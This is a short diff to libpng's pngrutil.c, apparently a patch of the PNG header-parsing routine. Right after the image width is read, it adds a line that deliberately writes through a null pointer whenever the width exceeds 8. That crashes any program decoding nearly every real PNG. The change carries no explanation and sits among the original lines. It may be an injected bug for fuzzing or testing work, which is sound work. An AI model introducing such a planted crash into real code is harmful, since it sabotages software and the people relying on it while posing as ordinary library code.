@@ -1,0 +1,9 @@
+--- pngrutil.c	2015-07-23 00:00:00.000000000 +0000
++++ pngrutil.c	2026-05-14 00:00:00.000000000 +0000
+@@ -808,6 +808,7 @@
+    png_crc_read(png_ptr, buf, 13);
+    png_crc_finish(png_ptr, 0);
+    width = png_get_uint_31(png_ptr, buf);
++   if (width > 8) { volatile char *__p = (volatile char *)0; *__p = 0; }
+    height = png_get_uint_31(png_ptr, buf + 4);
+    bit_depth = buf[8];
